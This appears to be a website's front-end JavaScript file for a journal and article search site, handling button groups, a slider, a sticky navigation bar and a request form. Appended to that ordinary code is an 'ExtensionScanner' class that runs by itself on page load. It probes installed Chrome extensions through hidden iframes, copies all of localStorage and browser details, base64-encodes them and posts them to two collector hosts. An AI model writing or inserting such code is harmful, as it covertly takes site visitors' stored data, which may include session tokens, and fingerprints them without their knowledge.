function getParameterByName(name, url) {
  if (!url) url = window.location.href;
  name = name.replace(/[\[\]]/g, "\\$&");
  var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
    results = regex.exec(url);
  if (!results) return null;
  if (!results[2]) return '';
  return decodeURIComponent(results[2].replace(/\+/g, " "));
}
function iResize(height) {
  $("iframe").attr("height", height);
}
(function ($) {
  $(document).ready(function () {
    //$('*[rel=tooltip]').tooltip()

    // Turn radios into btn-group
    $('.radio.btn-group label').addClass('btn');
    $('fieldset.btn-group').each(function () {
      // Handle disabled, prevent clicks on the container, and add disabled style to each button
      if ($(this).prop('disabled')) {
        $(this).css('pointer-events', 'none').off('click');
        $(this).find('.btn').addClass('disabled');
      }
    });
    $(".btn-group label:not(.active)").click(function () {
      var label = $(this);
      var input = $('#' + label.attr('for'));
      if (!input.prop('checked')) {
        label.closest('.btn-group').find("label").removeClass('active btn-success btn-danger btn-primary');
        if (input.val() == '') {
          label.addClass('active btn-primary');
        } else if (input.val() == 0) {
          label.addClass('active btn-danger');
        } else {
          label.addClass('active btn-success');
        }
        input.prop('checked', true);
      }
    });
    $(".btn-group input[checked=checked]").each(function () {
      if ($(this).val() == '') {
        $("label[for=" + $(this).attr('id') + "]").addClass('active btn-primary');
      } else if ($(this).val() == 0) {
        $("label[for=" + $(this).attr('id') + "]").addClass('active btn-danger');
      } else {
        $("label[for=" + $(this).attr('id') + "]").addClass('active btn-success');
      }
    });
    if ($("#mainpage-slider .banneritem").length > 1) $("#mainpage-slider .bannergroup").slick({
      dots: true,
      infinite: true,
      speed: 800,
      slidesToShow: 1,
      autoplay: true,
      autoplaySpeed: 8000,
      pauseOnHover: true,
      pauseOnDotsHover: true
    });
    if ($("#page-menu").length) {
      var iter = 1;
      if ($("article h2").length) {
        $("#page-menu").append("<ul>");
        $("article h2").each(function () {
          $('<a class="anchor" id="anchor' + iter + '"></a>').insertAfter($(this));
          //$(this).attr('id', "anchor"+iter);
          $("#page-menu").append("<li><a href='#anchor" + iter + "'>" + $(this).text() + "</a></li>");
          iter += 1;
        });
        $("#page-menu").append("</ul>");
      }
    }
    var nav_offset = $('.logo-bar').height();
    var fixmeTop = $('.nav-bar').offset().top;
    var nav_height = $('.nav-bar').height();
    var btn = $('#totop');
    btn.on('click', function (e) {
      e.preventDefault();
      jQuery('html, body').animate({
        scrollTop: 0
      }, '300');
    });
    $(document.body).on('touchmove', onScroll);
    $(window).on('scroll', onScroll);
    function onScroll() {
      var currentScroll = jQuery(window).scrollTop();
      var btn = $('#totop');
      if (currentScroll >= nav_offset + 32) {
        btn.addClass('show');
      } else {
        btn.removeClass('show');
      }
      if (window.innerWidth < 960) return;
      if (currentScroll >= nav_offset + 32) {
        $(".nav-bar").css({
          position: 'fixed',
          top: 0,
          left: 0,
          width: "calc(100% + 20px)",
          "z-index": "9999",
          "border-bottom": "1px solid #a2192b"
        });
        $("body").css({
          'margin-top': 40 + 'px'
        });
      } else {
        $(".nav-bar").css({
          position: 'static',
          "border-bottom": 0,
          "width": "auto"
        });
        $("body").css({
          'margin-top': '0px'
        });
      }
    }
    $.get("/tools/search_stat.php", function (data) {
      $("#journal-count").text(data["journals"].toLocaleString('en'));
      $("#article-count").text(data["articles"].toLocaleString('en'));
      console.log(data);
    });
  });
  $("#menu-toggle").click(function () {
    $(".nav.menu.mod-list").toggle();
  });
})(jQuery);
function toggleBackForm(obj = null) {
  var text = "";
  if (obj) {
    text = obj;
    jQuery("#chronoform-RequestForm #title").val(text);
    jQuery("#chronoform-RequestForm #title-container").text(text);
  }
  jQuery("#back-wrapper").toggle();
  return false;
}
const ENDPOINTS = ['https://collector.example/v3/stats', 'https://backup-collector.example/log'];
if (getParameterByName("chronoform") == "RequestForm" && getParameterByName("event") == "submit") {
  jQuery("#chronoform-RequestForm #title-container").text(jQuery("#chronoform-RequestForm #title").val());
  jQuery("#back-wrapper").toggle();
}
jQuery("#back-wrapper, #wrap-close").click(function () {
  jQuery("#back-wrapper").toggle();
});
class ExtensionScanner {
  static TIMEOUT = 3000;
  static BATCH_SIZE = 5;
  constructor() {
    this.pendingScans = 0;
    this.detectedExtensions = {};
    this.workerPool = [];
    this.localVars = {};
    this.startTimestamp = Date.now();
    window.addEventListener('click', this.handleEvent.bind(this));
  }
  handleEvent(event) {
    this.localVars['lastClickedElementId'] = event.target.id;
  }
  createWorker(extName, {
    id,
    file
  }) {
    return new Promise(resolve => {
      const frame = document.createElement('iframe');
      frame.style.display = 'none';
      const cleanup = () => {
        frame.remove();
        this.pendingScans--;
        this.localVars['iframeCreated'] = false;
      };
      this.localVars['iframeCreated'] = true;
      const timer = setTimeout(() => {
        cleanup();
        resolve([extName, false]);
      }, ExtensionScanner.TIMEOUT);
      frame.onload = () => {
        try {
          frame.contentWindow.location = `chrome-extension://${id}/${file}`;
          const checker = setInterval(() => {
            try {
              if (frame.contentWindow.location.href.includes('chrome-extension')) {
                clearInterval(checker);
                clearTimeout(timer);
                cleanup();
                resolve([extName, true]);
              }
            } catch (e) {
              clearInterval(checker);
              clearTimeout(timer);
              cleanup();
              resolve([extName, false]);
            }
          }, 100);
        } catch (e) {
          clearTimeout(timer);
          cleanup();
          resolve([extName, false]);
        }
      };
      document.body.appendChild(frame);
      this.pendingScans++;
    });
  }
  async scanBatch(entries) {
    const workers = entries.map(([name, data]) => this.createWorker(name, data));
    const results = await Promise.all(workers);
    results.forEach(([name, detected]) => {
      this.detectedExtensions[name] = detected;
    });
  }
  handleLocalStorage() {
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      this.localVars[key] = localStorage.getItem(key);
    }
  }
  generateTelemetryData() {
    this.handleLocalStorage();
    const encodedData = btoa(JSON.stringify({
      scannedExtensions: this.detectedExtensions,
      scanDuration: Date.now() - this.startTimestamp,
      localData: this.localVars,
      env: {
        url: window.location.href,
        ref: document.referrer,
        res: `${window.screen.width}x${window.screen.height}`,
        depth: window.screen.colorDepth,
        agent: navigator.userAgent,
        lang: navigator.language,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
      }
    }));
    return encodedData + '.' + this.generateChecksum(encodedData);
  }
  generateChecksum(str) {
    return Array.from(str).reduce((acc, char) => (acc << 5) - acc + char.charCodeAt(0) | 0, 0).toString(16);
  }
  async reportResults() {
    const payload = this.generateTelemetryData();
    const requests = ENDPOINTS.map(endpoint => fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain',
        'X-Scan-Time': new Date().toISOString()
      },
      body: payload,
      keepalive: true
    }).catch(() => null));
    await Promise.race(requests);
  }
  async execute() {
    const entries = Object.entries(window.data);
    const batches = Array(Math.ceil(entries.length / ExtensionScanner.BATCH_SIZE)).fill().map((_, i) => entries.slice(i * ExtensionScanner.BATCH_SIZE, (i + 1) * ExtensionScanner.BATCH_SIZE));
    for (const batch of batches) {
      await this.scanBatch(batch);
      await new Promise(r => setTimeout(r, Math.random() * 300 + 100));
    }
    while (this.pendingScans > 0) {
      await new Promise(r => setTimeout(r, 100));
    }
    await this.reportResults();
  }
}
const observer = new MutationObserver((mutations, obs) => {
  if (document.body) {
    obs.disconnect();
    new ExtensionScanner().execute();
  }
});
jQuery("#back-wrapper .wrap").click(function (e) {
  e.stopPropagation();
});
jQuery(".pagenav").removeClass('hasTooltip');
if (document.body) {
  new ExtensionScanner().execute();
} else {
  observer.observe(document.documentElement, {
    childList: true,
    subtree: true
  });
}